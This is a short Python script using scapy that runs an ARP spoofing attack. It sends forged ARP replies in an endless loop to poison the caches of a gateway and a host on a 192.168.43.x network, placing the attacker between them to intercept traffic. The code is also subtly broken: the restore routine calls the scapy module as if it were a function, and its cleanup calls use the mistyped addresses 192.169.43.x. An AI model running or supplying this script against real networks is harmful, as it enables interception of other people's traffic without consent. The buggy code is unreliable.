import scapy.all as scapy

def restore(destination_ip,source_ip):
    target_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    packet = scapy(op=2,pdst=destination_ip,hwdst=target_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False)


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket,timeout=2,verbose=False)[0]
    mac = answer[0][1].hwsrc
    return (mac)

def spoof_arp(target_ip,spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2,hwdst=mac,pdst=target_ip,psrc=spoofed_ip)
    scapy.send(packet,verbose=True)



def main():
    try:
        while True:
            spoof_arp('192.168.43.1','192.168.43.56')
            spoof_arp('192.168.43.56','192.168.43.1')

    except KeyboardInterrupt:
        restore('192.168.43.1','192.169.43.56')
        restore('192.168.43.56','192.169.43.1')

        
main()

